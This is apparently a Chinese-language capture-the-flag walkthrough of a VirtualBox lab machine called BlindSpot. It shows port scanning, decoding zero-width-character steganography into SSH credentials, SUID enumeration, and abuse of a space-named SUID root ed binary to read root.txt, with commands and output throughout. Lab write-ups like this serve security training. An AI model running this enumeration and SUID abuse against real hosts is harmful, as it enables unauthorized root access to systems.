---
title: BlindSpot-Ahiz
date: 2026-05-18T20:25:11+08:00
lastmod: 2026-05-18T21:21:02+08:00
---
# 信息收集

```
nmap -p-  192.168.100.51
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 08:17 EDT
Nmap scan report for 192.168.100.51
Host is up (0.0031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:83:D5:E8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds
```

```
sudo dirsearch -u http://192.168.100.51 
[sudo] password for kali: 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/http_192.168.100.51/_26-05-18_08-17-51.txt

Target: http://192.168.100.51/

[08:17:51] Starting: 
                                                                           
Task Completed
                                                    
```

# 80端口

访问首页时，浏览器里只能看到

```
Flag is not here
```

由于没有扫到其他端口和信息  然后去看HTTP 原始响应

使用python原始打印下来

```
import urllib.request

s = urllib.request.urlopen('http://192.168.100.51/').read().decode('utf-8')
print(repr(s))
```

得到信息

```
'Flag is not here\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200d\u200b\u200b\u200b\u200b\u200d\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200d\u200b\u200d\u200d\u200d\u200d\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200d\u200d\u200b\u200d\u200d\u200d\u200b\u200b\u200d\u200d\u200d\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200b\u200d\u200b\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200b\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200d\u200b\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200b\u200b\u200d\u200b\u200d\u200d\u200b\u200d\u200d\u200d\u200b\u200b\u200d\u200d\u200d\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200b\u200b\u200d\u200b\u200d\u200d\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200d\u200b\u200d\u200b\u200b\u200d\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200b\u200b\u200d\u200d\u200b\u200d\u200d\u200b\u200b\u200b\u200d\u200d\u200b\u200b\u200d\u200b\u200d\u200b\u200d\u200d\u200d\u200d\u200d\u200b\u200d'
```

# 零宽字符隐写

将页面源码或响应内容按原始形式输出后，可以看到其中出现了两种特殊 Unicode 字符：

\u200b - Zero Width Space

按 8 位一组转换为 ASCII，即可解出隐藏内容

```
import urllib.request

s = urllib.request.urlopen('http://192.168.100.51/').read().decode('utf-8')

zw = ''.join(ch for ch in s if ord(ch) in (0x200b, 0x200d))
bits = ''.join('0' if ord(ch) == 0x200b else '1' for ch in zw)

out = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print(out)
```

得到结果

```
flag{1nv151b13:invisible}
```

# 1nv151b13用户

```
用户名: 1nv151b13
密码: invisible
```

# SSH 登录并获取 user.txt

使用上一步得到的凭据登录 SSH：

ssh 1nv151b13@192.168.100.51

输入密码：

invisible

登录成功后查看当前目录：

pwd ls -la

可以看到 user.txt 位于用户家目录中：

/home/1nv151b13/user.txt

读取文件：

cat /home/1nv151b13/user.txt

得到 user.txt 内容：

flag{user-1f1ae47bd96611161d31fc093e6100ac}

# 提权枚举

获得普通用户 shell 后，按照常规思路进行本地提权枚举。

## 1. sudo 检查

首先检查 sudo 权限：

sudo -l

结果显示当前用户无法执行 sudo，因此不能从 sudo 方向直接提权。

## cron 与周期任务检查

继续查看定时任务和周期目录：

ls -la /etc/crontabs

结果显示：

root crontab 存在，但不可读

因此 cron 不是本题主要提权点。

## SUID 枚举

接着检查所有 SUID 文件：

find / -perm -u=s -type f 2>/dev/null

输出中出现了一项极不正常的内容：

```
/bin/umount
/bin/bbsuid
/bin/mount
/usr/bin/ 
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/chage
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
```

# /usr/bin/

```
/usr/bin/ 
```

这不是一个正常的程序名，看起来像一个“文件名只有空格”的可执行文件。这非常可疑，也明显不像系统默认组件，因此可以判断这很可能就是题目埋下的提权点。

# 定位异常 SUID 文件

为了确认该文件真实存在，可以进一步用 Python 精确枚举 /usr/bin 中的 SUID 文件：

```
python3 - <<'PY'
import os, stat
for root, dirs, files in os.walk('/usr/bin'):
    if root != '/usr/bin':
        continue
    for name in files:
        p = os.path.join(root, name)
        st = os.lstat(p)
        if st.st_mode & stat.S_ISUID:
            print(repr(p), oct(st.st_mode), st.st_uid, st.st_gid)
PY
```

输出结果中可以明确看到：

'/usr/bin/ ' 0o104755 0 0

说明：

文件路径确实为 /usr/bin/

进一步查看其属性：

stat "/usr/bin/ "

可以确认它是一个 SUID root 的 ELF 程序。

# 分析该程序行为

```
strings "/usr/bin/ "

Options:
  -h, --help                 display this help and exit
  -V, --version              output version information and exit
  -E, --extended-regexp      use extended regular expressions
  -G, --traditional          run in compatibility mode
  -l, --loose-exit-status    exit with 0 status even if a command fails
  -p, --prompt=STRING        use STRING as an interactive prompt
  -q, --quiet, --silent      suppress diagnostics written to stderr
  -r, --restricted           run in restricted mode
  -s, --script               suppress byte counts and '!' prompt
  -v, --verbose              be verbose; equivalent to the 'H' command
      --strip-trailing-cr    strip carriage returns at end of text lines
      --unsafe-names         allow control characters in file names
*Exit status*
```

# 命令执行

```
cat >/tmp/in1 <<'EOF'
!id
q
EOF
"/usr/bin/ " </tmp/in1
```

输出为：

```
uid=1000(1nv151b13) gid=1000(1nv151b13) groups=1000(1nv151b13)
!
```

# 利用 SUID 编辑器读取 root.txt

```
cat >/tmp/in5 <<'EOF'
e /root/root.txt
,p
q
EOF
```

e /root/root.txt：打开目标文件

输出

```
1nv151b13@BlindSpot:/$ "/usr/bin/ " </tmp/in5
44
flag{root-8083a5afb210d1ec3384979780320c1b}
```
